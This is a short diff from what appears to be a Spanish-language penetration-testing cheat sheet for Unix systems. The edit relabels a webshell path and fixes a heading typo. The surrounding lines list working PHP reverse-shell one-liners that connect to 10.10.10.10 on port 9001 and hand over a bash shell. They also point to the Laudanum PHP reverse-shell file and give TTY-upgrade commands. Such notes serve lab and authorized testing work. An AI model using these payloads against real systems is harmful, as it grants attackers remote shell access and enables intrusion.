@@ -52,10 +52,10 @@ Técnicas para utilizar en sistemas basados en unix
   php -r '$sock=fsockopen("10.10.10.10",9001);shell_exec("bash <&3 >&3 2>&3");'
   php -r '$sock=fsockopen("10.10.10.10",9001);system("bash <&3 >&3 2>&3");'
   php -r '$sock=fsockopen("10.10.10.10",9001);passthru("bash <&3 >&3 2>&3");'
-  /usr/share/webshells/laudanum/php/php-reverse-shell.php
+  Laudanum common reverse shell /usr/share/webshells/laudanum/php/php-reverse-shell.php
   ```
  
-### Spawning a TTY shel
+### Spawning a TTY shell
   ```bash 
       python3 -c 'import pty;pty.spawn("/bin/bash")' 
       script /dev/null -c bash 
